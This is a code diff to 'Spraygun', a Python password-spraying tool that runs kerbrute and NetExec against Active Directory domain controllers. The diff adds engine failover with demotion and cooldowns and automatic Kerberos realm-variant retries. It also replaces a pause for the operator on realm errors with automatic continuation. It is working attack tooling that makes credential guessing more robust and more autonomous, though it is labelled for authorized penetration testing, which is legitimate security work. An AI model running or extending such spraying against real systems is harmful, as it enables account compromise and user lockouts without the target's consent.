@@ -77,11 +77,16 @@ class Config:
     schedule: str = ""
     timeline: bool = False
     feed_lines: int = 50  # Number of lines in raw feed (default 50, was 20)
+    engine_cooldown_rounds: int = 3
+    engine_transient_threshold: int = 2
+    realm_retry: bool = True
+    verbose: bool = False
     # Derived fields
     users: List[str] = field(default_factory=list)
     passwords: List[str] = field(default_factory=list)
     nxc_binary: str = ""
     kerbrute_binary: str = ""
+    realm_candidates: List[str] = field(default_factory=list)
 
 @dataclass
 class Engine:
@@ -493,6 +498,15 @@ class State:
         # Feature E: Timeline visualization
         self.timeline_events: List[Dict] = []
 
+        # Failover memory: engine health tracking
+        self.engine_health: Dict[str, Dict] = {}
+        self.known_bad_realms: List[str] = []
+        self.working_realm: Optional[str] = None
+
+        # Stash cooldown/threshold config values for easy access
+        self.cooldown_rounds = cfg.engine_cooldown_rounds
+        self.transient_threshold = cfg.engine_transient_threshold
+
         if cfg.resume:
             self._load()
         else:
@@ -536,6 +550,11 @@ class State:
         # Load Feature E field
         self.timeline_events = data.get("timeline_events", [])
 
+        # Load failover memory fields
+        self.engine_health = data.get("engine_health", {})
+        self.known_bad_realms = data.get("known_bad_realms", [])
+        self.working_realm = data.get("working_realm", None)
+
         # Rebuild queue: all passwords minus used
         all_pw = [p.strip() for p in self.cfg.passwords if p.strip()]
         self.remaining_queue = [p for p in all_pw if p not in self.used_passwords]
@@ -564,6 +583,10 @@ class State:
             "delay_multiplier": self.delay_multiplier,
             # Feature E: Timeline
             "timeline_events": self.timeline_events,
+            # Failover memory
+            "engine_health": self.engine_health,
+            "known_bad_realms": self.known_bad_realms,
+            "working_realm": self.working_realm,
         }
         self.state_file.write_text(json.dumps(data, indent=2))
 
@@ -888,6 +911,88 @@ class State:
             "round": round_idx,
         })
 
+    # =============================================================================
+    # Failover memory: engine health tracking
+    # =============================================================================
+
+    def _fresh_health(self) -> Dict:
+        """Fresh engine health record."""
+        return {
+            "consecutive_failures": 0,
+            "demoted": False,
+            "cooldown_remaining": 0,
+            "demote_count": 0,
+            "last_reason": "",
+        }
+
+    def register_engine_failure(self, engine_key: str, abort_reason: str) -> None:
+        """
+        Register an engine failure and apply demotion logic if needed.
+        Transient failures (timeout, exception) demote after threshold.
+        Permanent failures (wrong-realm, binary-not-found, etc.) demote immediately.
+        """
+        h = self.engine_health.setdefault(engine_key, self._fresh_health())
+        h["consecutive_failures"] += 1
+        h["last_reason"] = abort_reason
+
+        # Check if this should trigger demotion
+        if abort_reason in HARD_DEMOTE_REASONS:
+            self._demote(engine_key, abort_reason)
+        elif h["consecutive_failures"] >= self.transient_threshold:
+            self._demote(engine_key, abort_reason)
+
+    def _demote(self, engine_key: str, abort_reason: str = "") -> None:
+        """Mark an engine as demoted and set cooldown with exponential backoff."""
+        h = self.engine_health[engine_key]
+        if not h["demoted"]:
+            h["demote_count"] = 0
+        h["demoted"] = True
+        h["demote_count"] += 1
+        h["cooldown_remaining"] = min(
+            self.cooldown_rounds * (2 ** (h["demote_count"] - 1)),
+            MAX_COOLDOWN
+        )
+        # Record demotion event (will flush on next save)
+        # Note: we don't have round_idx here; callers should record timeline if needed
+        detail = f"{engine_key}: {abort_reason or h.get('last_reason', '')}, cooldown {h['cooldown_remaining']}r"
+        self.record_timeline_event("engine_demote", detail)
+
+    def register_engine_success(self, engine_key: str) -> None:
+        """Register an engine success and restore it from demoted state."""
+        h = self.engine_health.setdefault(engine_key, self._fresh_health())
+        was_demoted = h["demoted"]
+        demote_count = h.get("demote_count", 0)
+        h["consecutive_failures"] = 0
+        h["demoted"] = False
+        h["cooldown_remaining"] = 0
+        h["demote_count"] = 0
+
+        # Record restoration event if this engine was demoted
+        if was_demoted:
+            detail = f"{engine_key}: back online after {demote_count} demotion(s)"
+            self.record_timeline_event("engine_restore", detail)
+
+    def tick_cooldowns(self) -> None:
+        """Decrement cooldown for all demoted engines (call once at round end)."""
+        for h in self.engine_health.values():
+            if h["demoted"] and h["cooldown_remaining"] > 0:
+                h["cooldown_remaining"] -= 1
+
+    def compute_effective_chain(self, full_chain: List["Engine"]) -> List["Engine"]:
+        """
+        Compute the per-password effective failover chain based on engine health.
+        Healthy + probe engines (cooldown expired) lead in original order.
+        Demoted-in-cooldown engines trail as last-resort safety net.
+        """
+        leading, trailing = [], []
+        for eng in full_chain:
+            h = self.engine_health.get(str(eng))
+            if not h or not h["demoted"] or h["cooldown_remaining"] == 0:
+                leading.append(eng)  # healthy, or probe (cooldown expired)
+            else:
+                trailing.append(eng)  # demoted, last resort only
+        return leading + trailing
+
     def render_timeline_html(self) -> str:
         """Generate self-contained HTML timeline visualization."""
         events = self.timeline_events
@@ -1034,13 +1139,16 @@ def classify_line(engine: Engine, line: str) -> Tuple[LineType, Optional[str]]:
 
     return (LineType.INFO, None)
 
-def spray_one_password(engine: Engine, cfg: Config, secret: str, ui: RichUI, state: State) -> RoundResult:
+def spray_one_password(engine: Engine, cfg: Config, secret: str, ui: RichUI, state: State, realm: Optional[str] = None) -> RoundResult:
     """
     Run one engine invocation for one password/hash. Stream stdout line-by-line,
     classify, update UI/state, and return RoundResult.
     Connection errors are tracked but don't abort the engine (failover chain handles it).
 
     Feature 1 (credential-reuse matrix): Uses a filtered userlist per password.
+
+    Args:
+        realm: Override domain for kerbrute (realm retry). If None, uses cfg.domain.
     """
     result = RoundResult()
 
@@ -1060,7 +1168,7 @@ def spray_one_password(engine: Engine, cfg: Config, secret: str, ui: RichUI, sta
     cfg.userfile = userlist_path
 
     try:
-        result = _spray_one_password_impl(engine, cfg, secret, ui, state, userlist_path)
+        result = _spray_one_password_impl(engine, cfg, secret, ui, state, userlist_path, realm)
 
         # Feature 1: For kerbrute, mark all users as attempted on clean finish
         # (kerbrute doesn't emit per-user lines for failures)
@@ -1075,10 +1183,60 @@ def spray_one_password(engine: Engine, cfg: Config, secret: str, ui: RichUI, sta
     return result
 
 
-def _spray_one_password_impl(engine: Engine, cfg: Config, secret: str, ui: RichUI, state: State, userlist_path: str) -> RoundResult:
+def spray_kerbrute_with_realm_retry(engine: Engine, cfg: Config, secret: str, ui: RichUI, state: State) -> RoundResult:
+    """
+    Run kerbrute with automatic realm-variant retry on wrong-realm failures.
+    Tries realm candidates (as-given, UPPER, parent, UPPER-parent) until one works.
+    Caches the working realm for the rest of the run.
+    """
+    # Fast path: already know a working realm
+    if state.working_realm:
+        return spray_one_password(engine, cfg, secret, ui, state, state.working_realm)
+
+    # Try each untried realm candidate
+    candidates = [r for r in cfg.realm_candidates if r not in state.known_bad_realms]
+    if not candidates:
+        # All variants exhausted
+        return RoundResult(
+            aborted=True,
+            abort_reason="wrong-realm",
+            errors=["all realm variants exhausted"]
+        )
+
+    last_result = None
+    for idx, realm in enumerate(candidates):
+        ui.console.print(f"[*] kerbrute: trying realm '{realm}' ({idx+1}/{len(cfg.realm_candidates)})", style="cyan")
+        result = spray_one_password(engine, cfg, secret, ui, state, realm)
+
+        if result.aborted and result.abort_reason == "wrong-realm":
+            state.known_bad_realms.append(realm)
+            remaining = len(candidates) - idx - 1
+            ui.console.print(f"[!] kerbrute: realm '{realm}' rejected (wrong realm) → crossing off, trying next ({remaining} variants left)", style="yellow")
+            last_result = result
+            continue
+
+        # Not a realm abort (success, or different abort) -> realm is acceptable
+        if not result.aborted:
+            state.working_realm = realm
+            ui.console.print(f"[+] kerbrute: realm '{realm}' works — cached for the rest of the run", style="green")
+            state.record_timeline_event("realm_found", f"working realm: {realm}")
+            return result
+
+        # Different abort reason (not realm-related)
+        return result
+
+    # All candidates exhausted
+    ui.console.print(f"[!] kerbrute: all {len(cfg.realm_candidates)} realm variants rejected — demoting kerbrute, failing over to nxc", style="yellow")
+    return last_result if last_result else RoundResult(aborted=True, abort_reason="wrong-realm")
+
+
+def _spray_one_password_impl(engine: Engine, cfg: Config, secret: str, ui: RichUI, state: State, userlist_path: str, realm: Optional[str] = None) -> RoundResult:
     """
     Internal implementation of spray_one_password after userlist filtering.
     Connection errors are tracked but don't abort (failover chain handles it).
+
+    Args:
+        realm: Override domain for kerbrute (realm retry). If None, uses cfg.domain.
     """
     result = RoundResult()
 
@@ -1151,7 +1309,7 @@ def _spray_one_password_impl(engine: Engine, cfg: Config, secret: str, ui: RichU
             result.abort_reason = "binary-not-found"
             return result
 
-        cmd = [binary, "passwordspray", "--dc", cfg.dc_ip, "-d", cfg.domain, userlist_path, secret]
+        cmd = [binary, "passwordspray", "--dc", cfg.dc_ip, "-d", realm or cfg.domain, userlist_path, secret]
 
     else:
         ui.console.print(f"[!] Unknown engine tool: {engine.tool}", style="red")
@@ -1226,7 +1384,7 @@ def _spray_one_password_impl(engine: Engine, cfg: Config, secret: str, ui: RichU
                     except subprocess.TimeoutExpired:
                         proc.kill()
                     result.aborted = True
-                    result.abort_reason = "tool-error"
+                    result.abort_reason = "wrong-realm"
                     break
 
             elif line_type == LineType.AUTHFAIL:
@@ -1542,6 +1700,32 @@ def wait_for_window(window: SprayWindow, ui: RichUI, console: Console, state: St
 # Failover chain building
 # =============================================================================
 
+# Engine health / demotion constants
+HARD_DEMOTE_REASONS = {"wrong-realm", "binary-not-found", "command-not-found",
+                       "invalid-protocol", "pth-kerbrute-incompatible", "unknown-engine"}
+MAX_COOLDOWN = 30  # cap for exponential backoff
+
+def derive_realm_candidates(domain: str) -> List[str]:
+    """
+    Derive Kerberos realm variant candidates from a domain.
+    Returns list: as-given, UPPERCASE, parent-domain, UPPERCASE-parent.
+    Examples:
+        sub.domain.com → [sub.domain.com, SUB.DOMAIN.COM, domain.com, DOMAIN.COM]
+        domain.com     → [domain.com, DOMAIN.COM]
+        lab.local      → [lab.local, LAB.LOCAL]
+    """
+    d = domain.strip()
+    candidates = [d, d.upper()]
+
+    # Extract parent domain if we have a subdomain (3+ parts)
+    parts = [p for p in d.split(".") if p]
+    if len(parts) >= 3:
+        parent = ".".join(parts[-2:])  # domain.com
+        candidates.extend([parent, parent.upper()])
+
+    # Dedupe while preserving order
+    return list(dict.fromkeys(candidates))
+
 def build_failover_chain(cfg: Config) -> List[Engine]:
     """
     Build ordered, de-duplicated list of engines for failover.
@@ -1697,6 +1881,32 @@ def run(cfg: Config, console: Console):
 
         console.print(f"\n[*] Round {round_idx + 1}: spraying {len(batch)} secret(s)", style="cyan")
 
+        # Compute effective chain for this round (engine health aware)
+        effective_chain = state.compute_effective_chain(chain)
+
+        # Check for probe rounds (demoted engines whose cooldown expired)
+        for eng in chain:
+            h = state.engine_health.get(str(eng))
+            if h and h["demoted"] and h["cooldown_remaining"] == 0:
+                # This engine is entering probe round
+                console.print(f"[*] PROBE: re-testing {eng} after cooldown", style="cyan")
+                detail = f"{eng}: re-probe after {state.cooldown_rounds} rounds"
+                state.record_timeline_event("probe", detail, round_idx=round_idx + 1)
+
+        # Show effective chain if any engine is demoted (or in verbose mode)
+        if cfg.verbose or any(state.engine_health.get(str(e), {}).get("demoted", False) for e in chain):
+            healthy = [str(e) for e in effective_chain if not state.engine_health.get(str(e), {}).get("demoted", False)]
+            demoted = [str(e) for e in chain if state.engine_health.get(str(e), {}).get("demoted", False)]
+            parts = []
+            if healthy:
+                parts.append(" → ".join(healthy))
+            if demoted:
+                cooldowns = [f"{e} ({state.engine_health.get(str(e), {}).get('cooldown_remaining', 0)}r)" for e in demoted]
+                demoted_str = " & ".join(cooldowns) + " demoted"
+                parts.append(f"({demoted_str})" if demoted else "")
+            if parts:
+                console.print(f"[*] Effective engines: {' → '.join(parts) if len(parts) > 1 else parts[0]}", style="cyan")
+
         # Feature E: Record round start timeline event
         state.record_timeline_event("round_start", "", round_idx=round_idx + 1)
 
@@ -1710,9 +1920,10 @@ def run(cfg: Config, console: Console):
         round_successes_this_round = []  # Track all successes in this round
 
         for secret in batch:
-            # Try each engine in failover chain
+            # Try each engine in the per-password effective chain (engine health aware)
             engine_success = False
-            for engine in chain:
+
+            for engine in effective_chain:
                 # Build batch info string
                 batch_info = f"Spraying {len(passwords_to_spray)} passwords (this round)"
                 if len(passwords_to_spray) > 1:
@@ -1725,7 +1936,10 @@ def run(cfg: Config, console: Console):
                 state.record_spray_start(engine, secret, round_idx + 1)
 
                 # Run spray
-                result = spray_one_password(engine, cfg, secret, ui, state)
+                if engine.tool == "kerbrute" and cfg.realm_retry:
+                    result = spray_kerbrute_with_realm_retry(engine, cfg, secret, ui, state)
+                else:
+                    result = spray_one_password(engine, cfg, secret, ui, state)
 
                 # Record stats
                 round_lockouts_this_round += len(result.lockouts)
@@ -1743,13 +1957,16 @@ def run(cfg: Config, console: Console):
 
                 ui.end_spray()
 
-                # If engine aborted (tool-error, timeout, exception, binary-not-found), try next
+                # If engine aborted (wrong-realm, binary-not-found, timeout, exception), try next
                 # Note: We no longer abort on conn-fail-limit; connection errors are tracked but don't stop the engine
                 if result.aborted:
-                    console.print(f"[-] {engine} aborted: {result.abort_reason}; trying next in chain...", style="yellow")
+                    state.register_engine_failure(str(engine), result.abort_reason)
+                    cooldown = state.engine_health.get(str(engine), {}).get("cooldown_remaining", 0)
+                    console.print(f"[-] {engine} failed ({result.abort_reason}); demoting for {cooldown} round(s)", style="yellow")
                     continue  # Try next engine
 
                 # Engine finished cleanly (or with partial results but no abort); move to next secret
+                state.register_engine_success(str(engine))
                 engine_success = True
                 break  # Don't continue failover chain for this secret
 
@@ -1813,6 +2030,22 @@ def run(cfg: Config, console: Console):
         if round_conn_fails_this_round > 0:
             console.print(f"    - Connection errors: {round_conn_fails_this_round} (informational - some engines may have issues but at least one succeeded)", style="cyan")
 
+        # Show engine health if any engine is demoted
+        if any(state.engine_health.get(str(e), {}).get("demoted", False) for e in chain):
+            console.print("    - Engine health:")
+            for eng in chain:
+                h = state.engine_health.get(str(eng), {})
+                if not h:
+                    status = "healthy"
+                    detail = ""
+                elif h["demoted"]:
+                    status = "DEMOTED"
+                    detail = f"cooldown {h['cooldown_remaining']}r, last: {h.get('last_reason', 'N/A')}"
+                else:
+                    status = "healthy"
+                    detail = ""
+                console.print(f"      {eng}: {status}" + (f" ({detail})" if detail else ""), style="yellow" if h.get("demoted") else "green")
+
         # Handle lockouts
         cumulative_lockouts = len(state.locked_users)
         should_continue = handle_lockouts(round_lockouts_this_round, cumulative_lockouts, cfg, ui, console)
@@ -1821,12 +2054,15 @@ def run(cfg: Config, console: Console):
             console.print("[*] Run stopped due to lockout threshold.", style="yellow")
             break
 
+        # Tick cooldowns for demoted engines (call at round end before next round)
+        state.tick_cooldowns()
+
         # Check for critical errors that should prevent countdown
+        # (No longer pause - just informational + let failover/demotion handle it)
         critical_errors = [e for e in round_errors_this_round if any(kw in e.lower() for kw in ["wrong realm", "cannot find kdc", "no kdc", "unknown realm"])]
         if critical_errors:
-            console.print("[!] Critical tool errors detected (wrong realm/domain). Pausing before countdown.", style="red")
-            ui.alert("CRITICAL ERRORS", "Tool reported domain/realm errors. Check your -d domain parameter. Press Enter to continue or Ctrl-C to abort.", "red")
-            input()  # Pause for operator
+            console.print(f"[*] {len(critical_errors)} realm/domain error(s) this round — handled via realm-retry + engine demotion (not pausing)", style="cyan")
+            state.record_timeline_event("realm_error", f"{len(critical_errors)} realm/domain errors", round_idx=round_idx + 1)
 
         # Feature D: Update throttle based on this round's conn fails
         throttle_mult = state.update_throttle(round_conn_fails_this_round)
@@ -1949,6 +2185,10 @@ For authorized penetration testing only.
     parser.add_argument("--schedule", help="Spray window: business-hours, off-hours, or HH:MM-HH:MM (default: unrestricted)")
     parser.add_argument("--timeline", action="store_true", help="Generate spray-timeline.html visualization")
     parser.add_argument("--feed-lines", type=int, default=50, help="Number of lines in raw feed panel (default: 50)")
+    parser.add_argument("--engine-cooldown", type=int, default=3, help="Rounds to skip a demoted engine before re-probe (default: 3)")
+    parser.add_argument("--engine-fail-threshold", type=int, default=2, help="Consecutive transient failures before demoting an engine (default: 2)")
+    parser.add_argument("--no-realm-retry", action="store_true", help="Disable kerbrute realm-variant auto-retry")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Maximum verbosity: full (masked) commands, every realm attempt, every failover hop")
 
     args = parser.parse_args()
 
@@ -2008,6 +2248,9 @@ For authorized penetration testing only.
         kerbrute_binary=kerbrute_bin,
     )
 
+    # Derive realm candidates for kerbrute auto-retry
+    cfg.realm_candidates = derive_realm_candidates(cfg.domain)
+
     # Load users and passwords
     with open(args.u, "r") as f:
         cfg.users = [line.strip() for line in f if line.strip()]
@@ -2026,6 +2269,10 @@ For authorized penetration testing only.
     # Author note
     console.print("[*] Spraygun — for authorized penetration testing only", style="dim")
     console.print(f"[*] Loaded {len(cfg.users)} users, {len(cfg.passwords)} secrets", style="cyan")
+
+    # Show realm candidates if using kerbrute
+    if cfg.tool == "kerbrute" or (cfg.tool == "nxc" and cfg.protocol == "smb"):  # SMB also uses Kerberos
+        console.print(f"[*] Kerbrute realm candidates: {' → '.join(cfg.realm_candidates)}", style="cyan")
 
     # Run
     try:
